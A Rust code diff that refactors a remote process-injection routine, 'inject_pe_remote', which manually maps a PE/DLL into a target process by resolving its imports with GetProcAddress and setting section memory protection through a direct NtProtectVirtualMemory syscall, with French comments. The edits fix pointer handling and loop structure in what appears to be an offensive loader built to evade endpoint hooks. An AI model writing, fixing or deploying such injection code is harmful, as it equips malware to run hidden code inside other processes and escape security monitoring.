@@ -320,13 +320,8 @@ fn inject_pe_remote(target_pid: u32, dll_bytes: &[u8]) -> Result<(), String> {
 
                 let mut iat_rva = desc.first_thunk;
 
-                loop {
-                    // Lire le thunk data (u64)
-                    let thunk_data: u64 = match pe.read_struct_at_rva(thunk_rva) {
-                        Some(val) => val,
-                        None => break,
-                    };
-
+                // Lire les thunks jusqu'à trouver un 0 ou fin de données
+                while let Some(thunk_data) = pe.read_struct_at_rva::<u64>(thunk_rva) {
                     if thunk_data == 0 {
                         break;
                     }
@@ -336,7 +331,7 @@ fn inject_pe_remote(target_pid: u32, dll_bytes: &[u8]) -> Result<(), String> {
                     // Vérifier si import par ordinal ou nom
                     if (thunk_data & IMAGE_ORDINAL_FLAG64) != 0 {
                         // Import par ordinal
-                        let ordinal = (thunk_data & 0xFFFF) as u64;
+                        let ordinal = thunk_data & 0xFFFF;
                         func_addr = GetProcAddress(h_module, ordinal as *const i8) as u64;
                     } else {
                         // Import par nom
@@ -399,7 +394,7 @@ fn inject_pe_remote(target_pid: u32, dll_bytes: &[u8]) -> Result<(), String> {
         debug_println!("\n[STEP 5] NtProtectVirtualMemory (per section)");
 
         for section in &pe.sections {
-            let section_addr =
+            let mut section_addr =
                 (base_address as usize + section.virtual_address as usize) as *mut c_void;
             let mut section_size = section.virtual_size as usize;
             let protection = section.to_protection();
@@ -408,7 +403,7 @@ fn inject_pe_remote(target_pid: u32, dll_bytes: &[u8]) -> Result<(), String> {
             let status: NTSTATUS = syscall!(
                 "NtProtectVirtualMemory",
                 h_process,
-                &mut (section_addr as *mut c_void) as *mut _ as *mut _,
+                &mut section_addr as *mut _ as *mut _,
                 &mut section_size as *mut usize,
                 protection,
                 &mut old_protect as *mut u32
@@ -550,8 +545,8 @@ fn main() {
             debug_println!("[✓] SUCCESS: PE injected and executed!");
             debug_println!("════════════════════════════════════════════");
         }
-        Err(e) => {
-            debug_eprintln!("\n[✗] ERROR: {}", e);
+        Err(_e) => {
+            debug_eprintln!("\n[✗] ERROR: {}", _e);
             std::process::exit(1);
         }
     }
